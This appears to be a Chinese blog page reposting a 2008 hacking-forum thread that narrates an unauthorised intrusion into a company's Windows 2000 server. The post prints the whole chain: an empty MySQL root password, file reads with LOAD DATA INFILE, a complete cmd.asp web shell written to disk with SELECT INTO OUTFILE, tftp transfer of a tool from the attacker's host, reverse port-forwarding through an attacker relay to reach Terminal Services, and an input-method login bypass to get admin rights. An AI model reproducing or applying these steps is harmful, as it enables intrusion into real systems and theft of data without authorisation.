
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>The 85 Page | It so life</title>
<meta name="author" content="RobinChia">

<meta name="description" content="It so life">


<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta property="og:site_name" content="It so life"/>

<!--[if IE]><style>.testIE.IE{display:inline;}</style><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" href="/css/ie7.css" type="text/css"><![endif]-->
<!--[if (lt IE 9)&(gt IE 7)]><style>.testIE.IE8{display:inline;}</style><![endif]-->
<!--[if gt IE 8]><style>.testIE.IE9{display:inline;}</style><![endif]-->

<link href="/favicon.png" rel="icon">
<link rel="alternate" href="/atom.xml" title="It so life Feed" type="application/atom+xml">

<link rel="stylesheet" href="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/css/bootstrap.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/font-awesome/4.0.3/css/font-awesome.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/prettify/r298/prettify.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" type="text/css">
<link rel="stylesheet" href="/css/style.css" type="text/css">
<!--[if lt IE 9]>
   <style>article,aside,dialog,footer,header,section,footer,nav,figure,menu{display:block}</style>
   <script src="http://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
   <script src="http://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
<link href="http://cdn.staticfile.org/respond.js/1.4.2/respond-proxy.html" id="respond-proxy" rel="respond-proxy" />
<link href="/js/respond.proxy.gif" id="respond-redirect" rel="respond-redirect" />
<script src="/js/respond.proxy.js"></script>
   <script src="http://cdn.bootcss.com/selectivizr/1.0.2/selectivizr-min.js"></script>
<![endif]-->
<script type="text/javascript">
function loadjs(c,d){var a=document.createElement("script");a.async=!0;a.type="text/javascript";a.src=c;a.charset=d||"gbk";(document.getElementsByTagName("HEAD")[0]||document.getElementsByTagName("BODY")[0]).appendChild(a)};
var _protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
var _js2load = [];
</script>

</head>
<body>
      <header id="header" class="container"><nav id="main-nav" class="navbar navbar-default navbar-fixed-top " role="navigation">
  <div class="container">
    <div class="navbar-header">
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
      <span class="sr-only">Toggle navigation</span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </button>
    <a class="navbar-brand" href="/">It so life</a>
    </div>
    <div  class="collapse navbar-collapse">
      <ul  class="nav navbar-nav">
  
        <li><a href="/" title="Home">Home</a></li>      
        <li><a href="/about/" title="About">About</a></li>      
        <li><a href="/archives/" title="Archives">Archives</a></li>      
      <li class='dropdown'>
        <a class='dropdown-toggle' data-toggle='dropdown' href='#'>website<b class='caret'></b></a>
        <ul class='dropdown-menu pure-menu-selected'>
    
          <li><a href="//groups.google.com/forum/#!forum/pongba" title="TopLanguage">TopLanguage</a></li>    
          <li><a href="//itpub.net/" title="ITPub">ITPub</a></li>    
          <li><a href="//blog.jobbole.com/" title="Bole">Bole</a></li>    
          <li><a href="//nosql-database.org/" title="nosql">nosql</a></li>    
          <li><a href="//gitimmersion.googol.im/" title="Git">Git</a></li>    
        </ul>
      </li>
    
      </ul>
      <ul class="nav navbar-nav navbar-right">
      
        <li><a href="/atom.xml">RSS</a></li>
      
      
        <li><a href="https://twitter.com/robinchia">twitter</a></li>
      
      
      
      
        <li><a href="https://github.com/robinchia">github</a></li>
      
      </ul>
    </div>
  </div>
</nav>
<div class="clearfix"></div>
</header>
  <div id='content' class="container">
     <div class="page-header-wrapper">
      <!--[if lt IE 9]><div class="alert alert-warning alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>提示:</strong>您的浏览器版本太低了,建议升级到 <strong><a href="http://windows.microsoft.com/zh-cn/internet-explorer/download-ie" title="IE9">IE9</a></strong> 以上,本站使用<a href="https://www.google.com/intl/zh-CN/chrome/">Chrome浏览器</a>可以获得最好的显示效果.</div><![endif]-->
      <div class="page-header"><h1 align="center"><big>It so life</big> </h1>
        <h5 align="center"><big>love as life</big></h5>
      </div>
     </div>
     <div class="row">
       <div id="main-col" class="alignleft col-sx-12 col-sm-8 col-md-9 col-lg-9">
      <section id='header_widget'></section>
          <div id="wrapper"><article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-X--3306端口的入侵mysql/">3306端口的入侵(mysql)</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-X--3306端口的入侵mysql/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="3306-mysql-">3306端口的入侵(mysql)</h1>
<h2 id="-bbs-syue-com-http-bbs-syue-com-index-php-bbs-syue-com-"><a href="http://bbs.syue.com/index.php" title="岁月联盟 - 技术社区 - BBS.SYUE.COM" target="_blank"><img src="" alt="岁月联盟 - 技术社区 - BBS.SYUE.COM"></a></h2>
<p><a href="http://bbs.syue.com/register.php" target="_blank">注册</a> <a href="http://bbs.syue.com/logging.php?action=login" target="_blank">登录</a></p>
<ul>
<li><a href="http://syue.com/" target="_blank">主站</a></li>
<li><a href="http://bbs.syue.com/index.php" target="_blank">论坛</a></li>
<li><a href="http://bbs.syue.com/search.php" target="_blank">搜索</a></li>
<li><a href="http://home.syue.com/" target="_blank">黑友会</a></li>
<li><a href="http://bbs.syue.com/faq.php" target="_blank">帮助</a></li>
<li><p><a href="http://bbs.syue.com/misc.php?action=nav" target="_blank">导航</a></p>
</li>
<li><p><a href="http://bbs.syue.com/pm.php?filter=newpm" target="_blank">私人消息 (0)</a></p>
</li>
<li><a href="http://bbs.syue.com/pm.php?filter=announcepm" target="_blank">公共消息 (0)</a></li>
<li><a href="http://bbs.syue.com/task.php?item=doing" target="_blank">论坛任务 (0)</a></li>
<li><a href="http://bbs.syue.com/notice.php?filter=systempm" target="_blank">系统消息 (0)</a></li>
<li><a href="http://bbs.syue.com/notice.php?filter=friend" target="_blank">好友消息 (0)</a></li>
<li><a href="http://bbs.syue.com/notice.php?filter=threads" target="_blank">帖子消息 (0)</a></li>
</ul>
<p><a href="http://bbs.syue.com/index.php" target="_blank">岁月联盟 - 技术社区 - BBS.SYUE.COM</a> » <a href="http://bbs.syue.com/forum-33-1.html" target="_blank">[ Hacking &amp; Defence ] 黑客攻击与防范</a> » 3306端口的入侵(mysql)
<a href="http://bbs.syue.com/forum-33-1.html" target="_blank">返回列表</a> <a href="http://bbs.syue.com/post.php?action=newthread&amp;fid=33" target="_blank">发帖</a></p>
<p><a href="http://bbs.syue.com/space.php?uid=7" target="_blank">猪猪</a></p>
<ul>
<li><a href="http://bbs.syue.com/pm.php?action=new&amp;uid=7" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.syue.com/my.php?item=buddylist&amp;newbuddyid=7&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.syue.com/space-uid-7.html" target="_blank">猪猪</a> <em>(Wei.H)**当前离线</em>
UID 7  帖子 7814  精华 230  积分 32287  威望 2777   金币 14812   贡献 3401   性别 男  来自 中国  在线时间 2333 小时  注册时间 2006-5-11  最后登录 2010-1-8 </p>
<p><a href="http://wpa.qq.com/msgrd?V=1&amp;Uin=100298&amp;Site=岁月联盟 - 技术社区 - BBS.SYUE.COM&amp;Menu=yes" title="QQ" target="_blank"><img src="" alt="QQ"></a><a href="http://home.syue.com/space.php?uid=7" title="个人空间" target="_blank"><img src="" alt="个人空间"></a> <a href="http://www.hackerspirit.com/" title="查看个人网站" target="_blank"><img src="" alt="查看个人网站"></a><a href="http://bbs.syue.com/space-uid-7.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.syue.com/space-uid-7.html" target="_blank"><img src="" alt=""></a></p>
<p><em><a href="http://bbs.syue.com/faq.php?action=grouppermission&amp;searchgroupid=1" target="_blank">等级：管理员</a></em></p>
<p><img src="&quot;Rank: 22&quot;" alt=""></p>
<p><img src="&quot;闪坛最高荣誉勋章&quot;" alt="闪坛最高荣誉勋章"><img src="&quot;优秀版主勋章&quot;" alt="优秀版主勋章">
 <strong><a href="&quot;复制本帖链接&quot;"><em>1</em>/#</a> <em>跳转到 »</em> <a href="http://bbs.syue.com/viewthread.php?tid=24861&amp;extra=page%3D1&amp;ordertype=1" target="_blank">倒序看帖</a></strong></p>
<p><a href="http://bbs.syue.com/viewthread.php?action=printable&amp;tid=24861" target="_blank">打印</a></p>
<p>字体大小: tT</p>
<p><img src="" alt=""> <em>发表于 2008-5-11 11:52</em> | <a href="http://bbs.syue.com/viewthread.php?tid=24861&amp;page=1&amp;authorid=7" target="_blank">只看该作者</a></p>
<h1 id="3306-mysql-">3306端口的入侵(mysql)</h1>
<p>这一节说一下3306端口,通过Mysql入侵服务器.
坦白的讲，我对mysql知道的太少,只是知它于mssql相对应的1433端口，它是3306。在w2k上它主要和是php组合，我一直学习的是asp+acess,没学习过mysql,也从来没有通过mysql成功入侵过服务器.为了使我的总结生一点光，全面一点,我这儿就转一篇文章，利用mssql入侵w2k服务器。全文如下,我加了一个图和一点注解和读后感:
某天晚上在IRC的时候，一个老朋友说帮他看看他的新主页的安全性，然后给出URL是abc.target.net,我一看觉得挺眼熟的，target.net公 司里面的CEO，人事部经理，网管我都认识的，前段时间还差点去了那里做网管呢，呵呵，那就看看他们的服务器做的如何吧。
随后用nmap扫描了一下abc.target.net，发现开的端口挺多的，看来没有安装防火墙或做TCP/IP过滤。从IIS版本判断是Windows 2000的服 务器。IIS没什么好利用的，一看开了3306端口，是mysql的，就用我的mysql客户端尝试连接了一下，root的密码竟然为空(lcx注:默认安装)，后来就觉得没有多 大意思，于是把目标转<a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>，他们的主站，哈哈。
Ok!先用nmap扫描一下，扫描结果如下：
25/tcp open smtp
53/tcp open domain
80/tcp open http
110/tcp open pop-3
389/tcp open ldap
1002/tcp open unknown
3306/tcp open mysql
然后从IIS版本判断目标是windows 2000服务器。从开放的端口来看，它要么是安装了防火墙，要么是做了TCP/IP过滤，呵呵，比 abc.target.net有意思多了。从25和110端口返回的数据来看，他们用的邮件服务器是IMail 6.04，没什么可利用的。IIS上面网管做了安全配 置，一些默认的CGI漏洞也没有，这也没什么好利用的。只剩下最后一个端口了，习惯性的用我的mysql客户端连接试试：
F:\cmd〉mysql -u root -h <a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>
Welcome to the MySQL monitor. Commands end with or \g.
Your MySQL connection id is 3038 to server version: 3.23.21-beta
Type &lt;|&gt;help;&lt;|&gt; or &lt;|&gt;\h&lt;|&gt; for help. Type &lt;|&gt;\c&lt;|&gt; to clear the buffer
mysql〉
也有图形连接方式,lcx给你个图看看.
<img src="" alt=""> <img src="" alt="MySQL.gif"></p>
<p><a href="http://bbs.syue.com/attachment.php?aid=NzMwNnwzMTc2ZjZkNXwxMjYyOTQ1ODE0fGM4MDVOTHF2T2t1bFd5cjZ4TEhwSFRtNXdLL0RFUWpxMjNWWE13MEhVQlp3Q2tr&amp;nothumb=yes" title="MySQL.gif" target="_blank"><strong>下载</strong></a> (14.15 KB)
2008-5-11 11:52
呵呵，不好意思，看来网管没有给mysql帐号root设置一个密码，是默认的空密码，那么我们就可以利用这个漏洞来做点什么了。如果是 MS-SQL数据库的话就好办啦，直接可以用xp_cmdshell来运行系统命令，但是可惜的是mysql没有类似MS-SQL那样的扩展存储过程。
现在我们可以利用这个漏洞来做三件事情：
〈1〉搜索mysql数据库里面的内容，看能不能找出一些有用的敏感信息，我找了一会儿就不想找了，呵呵
〈2〉读取服务器上的任何文件，当然前提是知道文件的物理路径
〈3〉以启动mysql服务用户的权限往服务器上写文件，前提是这个文件要不存在的，就是说不能覆盖文件
如果我们知道IIS主目录的物理路径的话,我们就可以往上面写一个ASP上去，然后通过IE来执行系统命令。怎么得到IIS目录的物理路径呢 ？天知道！
没办法，猜吧。。。。。。先在mysql默认数据库test中建一个表tmp，这个表只有一个字段str,类型为TEXT,
mysql〉 use test;create table tmp（str TEXT）;
Database changed
Query OK, 0 rows affected （0.05 sec）
然后凭着自己做网管的直觉，开始猜测IIS主目录的物理路径，c:\inetpub\wwwroot，c:\www，c:\wwwroot，c:\inetpub\web,d:\web， d:\wwwroot，都不对，55555。大概猜测到第10次，我的mysql客户端回显信息如下：
mysql〉load data infile &quot;d:\www\gb\about\about.htm&quot; into table tmp;
Query OK, 235 rows affected （0.05 sec）
Records: 235 Deleted: 0 Skipped: 0 Warnings: 0
哈哈哈，猜中了，IIS主目录的物理路径是d:\www，因为上面的文件的虚拟路径是<a href="http://www.target.net/gb/about/about.htm" target="_blank"><a href="http://www.target.net/gb/about/about.htm">http://www.target.net/gb/about/about.htm</a></a>，看来我得
到一个shell了，呵呵。
接下来我们就可以往d:\www\gb\about里面写一个ASP文件进去，然后通过<a href="http://www.target.net/gb/about/cmd.asp" target="_blank"><a href="http://www.target.net/gb/about/cmd.asp">http://www.target.net/gb/about/cmd.asp</a></a>来执行系统命令了。
然后在网上找来一个现成的cmd.asp，懒的自己去写了：）。Cmd.asp如下：
-------------------------------cmd.asp----------------------------------------
〈% Dim oScript
Dim oScriptNet
Dim oFileSys, oFile
Dim szCMD, szTempFile
On Error Resume Next
Set oScript = Server.CreateObject（&quot;&quot;WSCRIPT.SHELL&quot;&quot;）
Set oScriptNet = Server.CreateObject（&quot;&quot;WSCRIPT.NETWORK&quot;&quot;）
Set oFileSys = Server.CreateObject（&quot;&quot;Scripting.FileSystemObject&quot;&quot;）
szCMD = Request.Form（&quot;&quot;.CMD&quot;&quot;）
If （szCMD 〈〉 &quot;&quot;&quot;&quot;） Then
szTempFile = &quot;&quot;C:\&quot; &amp; oFileSys.GetTempName（）
Call oScript.Run （&quot;&quot;cmd.exe /c &quot;&quot; &amp; szCMD &amp; &quot;&quot; 〉 &quot;&quot; &amp; szTempFile, 0, True）
Set oFile = oFileSys.OpenTextFile （szTempFile, 1, False, 0）
End If %〉
〈HTML〉〈BODY〉〈FORM action=&quot;&quot;〈%= Request.ServerVariables（&quot;&quot;URL&quot;&quot;） %〉&quot;&quot; method=&quot;&quot;POST&quot;&quot;〉
〈input type=text name=&quot;&quot;.CMD&quot;&quot; size=45 value=&quot;&quot;〈%= szCMD %〉&quot;&quot;〉〈input type=submit value=&quot;&quot;Run&quot;&quot;〉〈/FORM〉〈PRE〉
〈% If （IsObject（oFile）） Then
On Error Resume Next
Response.Write Server.HTMLEncode（oFile.ReadAll）
oFile.Close
Call oFileSys.DeleteFile（szTempFile, True）
End If%〉
〈/BODY〉〈/HTML〉
----------------------------end of cmd.asp-----------------------------------
由于往mysql数据库中插入数据的时候，会过滤特殊字符什么的，例如双引号之类的，特别麻烦。各位留意没有，上面的ASP语句中，都是 两个双引号一起的，这样才能写进去，原来是一个双引号的。然后我在数据库中再建一个表：
mysql〉 use test;create table cmd（str TEXT）;
Database changed
Query OK, 0 rows affected （0.05 sec）
然后用如下语句，一句一句把上面的ASP写进去:
mysql〉 insert into cmd values（&quot;一行一行的asp代码，呵呵&quot;）;
为什么不全部一起写进去呢？呵呵，换行后，一会儿导出的文件就会有特殊字符了，asp就不能正常运行了，只能辛苦点一行一行写了。然 后把asp文件导到服务器上：
mysql〉select /<em> from cmd into outfile &quot;d:\www\gb\abou\cmd.asp&quot;;
然后把我们刚才建的表都删除掉：
mysql〉 use test; drop table tmp; drop table cmd;
ok!我们得到一个shell了，虽然权限不高，但毕竟已经向取得admin权限迈出一大步了，不是吗，呵呵。做这个asp文件可花了我不少时间 哦。现在我们利用这个shell来收集系统信息，尝试取得admin权限。
〈1〉先看一下系统文件权限设置如何：
c:\ Everyone:（OI）（CI）F
d:\ \xxx:（OI）（CI）（DENY）（特殊访问:）
DELETE
READ_CONTROL
WRITE_DAC
WRITE_OWNER
STANDARD_RIGHTS_REQUIRED
FILE_READ_DATA
FILE_WRITE_DATA
FILE_APPEND_DATA
FILE_READ_EA
FILE_WRITE_EA
FILE_EXECUTE
FILE_DELETE_CHILD
FILE_READ_ATTRIBUTES
FILE_WRITE_ATTRIBUTES
Everyone:（OI）（CI）F
看来我们现在就可以读写硬盘上的任何文件了，现在就可以改他的首页了，但这样做没意思，对不对，我们的目标是取得admin权限，呵呵 。
〈2〉然后搜索一下硬盘上都有些什么文件：
c:\Program Files 的目录下有两个比较有意思的文件，
2000-12-19 13:10 　Serv-U
2001-01-20 22:43 绿色警戒
把Serv-U里面的用户和密码读出来看看后，没有什么用处，然后进入绿色警戒目录看看，呵呵，除了log外，什么都没有，呵呵。
〈3〉再看看都有哪些用户：
Guest IUSR_SERVER_1 IUSR_SERVER-2
IWAM_SERVER_1 IWAM_SERVER-2 ceo[他们CEO的帐号J]
TsInternetUser
管理员有ceo 和target\Domain Admins，看来这台机器是他们域中的一台服务器。开始本来想给ceo下一个套，在他的启动目录里放一个程序，但后来看到这个帐号已经几个月没登陆了，就放弃了。
〈4〉看看启动了那些服务，这几个比较有意思, 看来都是默认的：
Task Scheduler
Simple Mail Transport Protocol （SMTP）
Task Scheduler
〈5〉看看网络状况，这几个比较有意思：
TCP 0.0.0.0:21 0.0.0.0:0 LISTENING
TCP 0.0.0.0:119 0.0.0.0:0 LISTENING
TCP 192.168.1.3:3389 0.0.0.0:0 LISTENING
看来有TermService，不过在网卡上做了TCP/IP过滤，只对内网开放，那么我们就来
〈6〉看看网卡设置信息：
Ethernet adapter 本地连接:
Connection-specific DNS Suffix . :
Description . . . . . . . . . . . : Realtek RTL8139（A） PCI Fast Ethernet Adapter
Physical Address. . . . . . . . . : 00-E0-4C-68-C4-B2
DHCP Enabled. . . . . . . . . . . : No
IP Address. . . . . . . . . . . . : 192.168.1.3
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . :
DNS Servers . . . . . . . . . . . :
Ethernet adapter 本地连接 2:
Connection-specific DNS Suffix . :
Description . . . . . . . . . . . : Realtek RTL8139（A） PCI Fast Ethernet Adapter/#2
Physical Address. . . . . . . . . : 00-E0-4C-68-B8-FC
DHCP Enabled. . . . . . . . . . . : No
IP Address. . . . . . . . . . . . :xxx
Subnet Mask . . . . . . . . . . . :
Default Gateway . . . . . . . . . :
经过上面的一些步骤，对这台服务器的设置情况就有了一个大概的了解。如何取得admin权限？netdde?pipeupadmin?呵呵，无法利用，没 有可利用的可以登陆的用户。下套？等到什么时候，呵呵。
Okok!让我们来看看这个系统都打了些什么补丁。怎么查看？呵呵，打了补丁后，信息都会存贮在注册表中，查询注册表中的这个键值就行
了：&quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\hotfix&quot;，这样的话，我们得上传一个reg.exe[M$ Resource Kit中的命令行注册 表编辑器]到服务器里面，我们才能操作他的注册表。开始我想用先写一个ftp脚本，然后ftp -s:cmd.txt让他到我的服务器来下载，但结果失 败了，后来才想起他做了TCP/IP过滤，5555，我记性真不好。怎么办呢？有办法，用tftp来传输。我先在我的服务器上安装了一个Cisco TFTP
Server，然后在目标机器上运行tftp -I <a href="http://www.eyas.org/" target="_blank"><a href="http://www.eyas.org/">http://www.eyas.org/</a></a> GET reg.exe，呵呵，传输过去咯。然后运行
REG QUERY &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\hotfix&quot;
返回数据如下：
Listing of [Software\Microsoft\Windows NT\CurrentVersion\hotfix]
[Q147222]==〉这个不知道是什么东西，好象默认2k机器上都有
[Q269862]==〉Q269862_W2K_SP2_x86_CN.EXE==〉Microsoft IIS Unicode解码目录遍历漏洞!
[Q277873]==〉Q277873_W2K_sp2_x86_CN.EXE==〉Microsoft IIS CGI文件名检查漏洞!
呵呵，==〉和后面的说明是我加上去的，不是注册表中的。看来管理员不太勤快啊，只打了两个补丁。
哈哈！到了这一步，大家想到怎么取得admin权限了吗？呵呵，你一定也想到了，他的机器开了TermService服务，但windows2000登陆验证 可被绕过的漏洞没有安装补丁，此补丁为Q270676_W2K_SP2_x86_CN.EXE。由此看来，管理员只是删除了帮助法文件，而没有打补丁。用dir
c:\winnt\help\win/</em>验证一下，果然没有熟悉的输入法帮助文件。敌人没有输入法，我们帮他造，hoho~~别忘了我们可以往任何地方写文件哦。
嘻嘻，咱们也别高兴的太早了，别忘了他的机器做了TCP/IP过滤哦，我们是没有办法连接到他的3389端口的。不要着急，不要着急，让我 们先来看看他的TCP/IP过滤的设置情况。怎么看呢？老办法，查看注册表里面的键值啦。用刚才的reg.exe查询
〈1〉reg QUERY &quot;HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces&quot;
Listing of [System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces]
[{4B41CFFB-4A20-42F8-9087-A89FE71FD8F4}]
[{612A3142-DB85-4D4E-8028-81A9EB4D6A51}]
〈2〉reg QUERY &quot;HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\
{4B41CFFB-4A20-42F8-9087-A89FE71FD8F4}&quot;
Listing of [System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\
{4B41CFFB-4A20-42F8-9087-A89FE71FD8F4}]
MULTI_SZ IPAddress
MULTI_SZ TCPAllowedPorts 25;53;80;110;3306;
MULTI_SZ UDPAllowedPorts 0;
MULTI_SZ RawIPAllowedProtocols 0;
〈3〉reg QUERY &quot;HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\
{612A3142-DB85-4D4E-8028-81A9EB4D6A51}&quot;
Listing of [System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\
{612A3142-DB85-4D4E-8028-81A9EB4D6A51}]
MULTI_SZ IPAddress 192.168.1.3;
MULTI_SZ TCPAllowedPorts 0;
MULTI_SZ UDPAllowedPorts 0;
MULTI_SZ RawIPAllowedProtocols 0;
篇幅关系，我过滤了一些输出。第二次查询的是外网网卡，我们可以得知只开放了TCP 25，53，80，110，3306，UDP全部，IP协议全部。 第三次查询的是内网网卡，没有任何限制。
现在我们可以把输入法帮助文件上传到他的c:\winnt\help目录下去，然后如果能连接到他的3389端口的话，我们就可以得到admin权限了。问 题的关键是外网网卡做了TCP/IP限制。55555，怎么办呢？如何突破？有办法！我们可以利用socket转发和反弹端口技术，照样可以连接到敌人 的TermService！
具体过程如下：
〈1〉在我的另一台服务<a href="http://www.eyas2.org/" target="_blank"><a href="http://www.eyas2.org/">http://www.eyas2.org/</a></a>[我称他为AgentMaster]上运行一个程序，监听3389端口[等待我的TermClient去连接]，监听11111端
口[等<a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>来连接]，当然了，第2个端口可以随便选，第1个端口选其他的话，就要相应的修改
TermClient，比较麻烦
〈2〉<a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>[我称他为AgentSlave]运行另外一个程序， 先连接<a href="http://www.eyas2.org:11111/" target="_blank"><a href="http://www.eyas2.org:11111/">http://www.eyas2.org:11111/</a></a>，再连接到192.168.1.3:3389[敌人服务器 内网的IP]
〈3〉 我的TermClient连接<a href="http://www.eyas2.org:3389/" target="_blank"><a href="http://www.eyas2.org:3389/">http://www.eyas2.org:3389/</a></a>，这样，数据通道就全部建立好了。接下来，两个程序就忠实的为我们转发数据了。
注意<a href="http://www.eyas2.orgwww.eyas.org/" target="_blank"><a href="http://www.eyas2.orgwww.eyas.org/">http://www.eyas2.orgwww.eyas.org/</a></a>可以为同一台服务器，但要保<a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>能connect上你的服务器。192.168.1.3也可以换为他内网 的任何一个IP。这样，当我用TermClient连接<a href="http://www.eyas2.org/" target="_blank"><a href="http://www.eyas2.org/">http://www.eyas2.org/</a></a>的时候，其实是连接<a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>。当熟悉的登陆界面出现在我面前，我熟练的调出输入法，取得admin权限，呵呵，心里还有那么一点点成就感！
简要的回顾一下：发现mysql漏洞==〉凭直觉猜中IIS物理路径==〉写一个cmd.asp文件上去得到一个shell==〉利用系统配置错误取得admin 权限接下来要做的事情，就是把漏洞通知他们的网管了[我可不敢直接告诉他们CEO，呵呵]，本来想在那机器上装个sniff什么的，再用来做跳 板进一步尝试入侵他的内网，但后来想想还是算了，呵呵。
这是我在网上发现一篇好文章,读起来如饮香醇,满心喜悦,并对作者由衷佩服，赞赏他的技术,更是思路.这也是我们菜鸟和伪高手努力的一个方向了.mysql入门指南。
<a href="">收藏</a> <a href="">分享</a>  **</p>
<p><a href="http://bbs.syue.com/space.php?uid=23555" target="_blank">djyangmaowei</a></p>
<ul>
<li><a href="http://bbs.syue.com/pm.php?action=new&amp;uid=23555" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.syue.com/my.php?item=buddylist&amp;newbuddyid=23555&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.syue.com/space-uid-23555.html" target="_blank">djyangmaowei</a> <em>当前离线</em>
UID 23555  帖子 65  精华 0  积分 141  威望 0   金币 66   贡献 0   在线时间 10 小时  注册时间 2008-4-29  最后登录 2008-9-17 </p>
<p><a href="http://home.syue.com/space.php?uid=23555" title="个人空间" target="_blank"><img src="" alt="个人空间"></a> <a href="http://bbs.syue.com/space-uid-23555.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href=""></a></p>
<p><a href="http://bbs.syue.com/space-uid-23555.html" target="_blank"><img src="" alt=""></a></p>
<p><em><a href="http://bbs.syue.com/faq.php?action=grouppermission&amp;searchgroupid=12" target="_blank">级别：上士</a></em></p>
<p><img src="&quot;Rank: 7&quot;" alt="">
 <strong><a href="&quot;复制本帖链接&quot;"><em>2</em>/#</a></strong></p>
<p><img src="" alt=""> <em>发表于 2008-5-19 16:44</em> | <a href="http://bbs.syue.com/viewthread.php?tid=24861&amp;page=1&amp;authorid=23555" target="_blank">只看该作者</a></p>
<p>qianghan  **</p>
<p><a href="">TOP</a>
<a href="http://bbs.syue.com/forum-33-1.html" target="_blank">返回列表</a></p>
<h3 id="-"><a href="">[收藏此主题]</a>  <a href="">[关注此主题的新回复]</a></h3>
<h3 id="-qq-msn-"><a href="">[通过 QQ、MSN 分享给朋友]</a></h3>
<p><strong><a href="http://bbs.syue.com/" target="_blank">岁月联盟</a></strong> ( <a href="http://www.miibeian.gov.cn/" target="_blank">皖ICP备05004589号 - 联系QQ:100298</a>)|<a href="mailto:admin@syue.com">联系我们</a> |<a href="http://bbs.syue.com/stats.php" target="_blank">论坛统计</a>|<a href="http://bbs.syue.com/archiver/" target="_blank">Archiver</a>|<a href="http://bbs.syue.com/wap/" target="_blank">WAP</a>|</p>
<p>GMT+8, 2010-1-8 18:16.</p>
<p>Powered by <strong><a href="http://www.discuz.net/" target="_blank">Discuz!</a></strong> <em>7.2</em></p>
<p>© 2001-2009 <a href="http://www.comsenz.com/" target="_blank">Comsenz Inc.</a>
<a href="http://www.google.com/" target="_blank"><img src="" alt="Google"></a> 输入您的搜索字词  提交搜索表单   Web syue.com</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/X/">X</a></li></span></span> | <span class="tags">Tagged <a href="/tags/X/" class="label label-primary">X</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-X--3306端口的入侵mysql/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-X--3306端口的入侵mysql" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-Scripts--BrowserSecurity-css、javascript/">Browser Security</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-Scripts--BrowserSecurity-css、javascript/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="browser-security-css-javascript">Browser Security-css、javascript</h1>
<h3 id="-">分享到</h3>
<ul>
<li><a href="">一键分享</a></li>
<li><a href="">QQ空间</a></li>
<li><a href="">新浪微博</a></li>
<li><a href="">百度云收藏</a></li>
<li><a href="">人人网</a></li>
<li><a href="">腾讯微博</a></li>
<li><a href="">百度相册</a></li>
<li><a href="">开心网</a></li>
<li><a href="">腾讯朋友</a></li>
<li><a href="">百度贴吧</a></li>
<li><a href="">豆瓣网</a></li>
<li><a href="">搜狐微博</a></li>
<li><a href="">百度新首页</a></li>
<li><a href="">QQ好友</a></li>
<li><a href="">和讯微博</a></li>
<li><a href="">更多...</a></li>
</ul>
<p><a href="">百度分享</a></p>
<h1 id="-wooyun-http-drops-wooyun-org-wooyun-"><a href="http://drops.wooyun.org/" title="WooYun知识库" target="_blank">WooYun知识库</a></h1>
